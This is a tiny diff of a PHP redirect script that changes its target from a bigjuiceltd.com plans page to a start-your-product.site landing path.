@@ -1,4 +1,4 @@
 <?php
-header("Location: https://www.bigjuiceltd.com/juice-plans");
+header("Location: https://start-your-product.site/actmca/");
 die();
 ?>
